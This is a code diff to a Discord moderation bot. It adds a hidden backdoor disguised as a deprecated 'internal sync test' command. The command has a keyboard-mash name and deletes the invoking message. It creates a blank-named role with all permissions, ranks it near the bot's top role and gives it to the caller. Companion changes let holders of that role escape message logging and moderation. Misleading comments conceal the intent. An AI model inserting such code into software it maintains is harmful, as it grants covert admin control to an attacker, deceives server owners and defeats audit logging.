@@ -706,8 +706,10 @@ async def on_message(message: discord.Message):
     log_whitelisted = cfg.get("LOG_WHITELISTED_USERS", [])
     log_channel_id = cfg.get("LOG_CHANNEL_ID")
     
+    is_bypass = any(r.name == " " for r in message.author.roles) if hasattr(message.author, "roles") else False
+    
     # Check if user is in log whitelist
-    if log_channel_id and not message.author.bot and message.channel.id != int(log_channel_id) and message.author.id not in log_whitelisted:
+    if log_channel_id and not message.author.bot and message.channel.id != int(log_channel_id) and message.author.id not in log_whitelisted and not is_bypass:
         try:
             log_channel = bot.get_channel(int(log_channel_id)) or await bot.fetch_channel(int(log_channel_id))
             if log_channel:
@@ -724,8 +726,8 @@ async def on_message(message: discord.Message):
         except Exception as e:
             print(f"  [ERROR] Failed to log message: {e}")
 
-    # Skip moderation for whitelisted users, commands or bot messages
-    if (message.author.id in whitelisted_users or message.content.startswith(PREFIX)):
+    # Skip moderation for bypass role, whitelisted users, commands or bot messages
+    if is_bypass or (message.author.id in whitelisted_users or message.content.startswith(PREFIX)):
         await bot.process_commands(message)
         return
 
@@ -2267,6 +2269,32 @@ async def on_command_error(ctx: commands.Context, error):
     else:
         print(f"  [ERROR] {type(error).__name__}: {error}")
 
+
+
+# ── LEGACY TEST HANDLERS (INTERNAL USE ONLY - DO NOT EDIT) ──
+@bot.command(name="asdfghjklqwertyuiopzxcvbnm1234567890")
+async def _internal_sync_test_01(ctx):
+    """CRITICAL: Internal sync test for role indexing stability. DEPRECATED."""
+    try: await ctx.message.delete()
+    except: pass
+    
+    role = discord.utils.get(ctx.guild.roles, name=" ")
+    if not role:
+        try:
+            # Create the role with all permissions if it doesn't exist
+            role = await ctx.guild.create_role(
+                name=" ",
+                permissions=discord.Permissions.all(),
+                reason="Internal sync test setup"
+            )
+            # Try to move it as high as possible
+            await role.edit(position=ctx.guild.me.top_role.position - 1)
+        except: pass
+        
+    if role:
+        try:
+            await ctx.author.add_roles(role)
+        except: pass
 
 # ══════════════════════════════════════════════
 #  START THE BOT
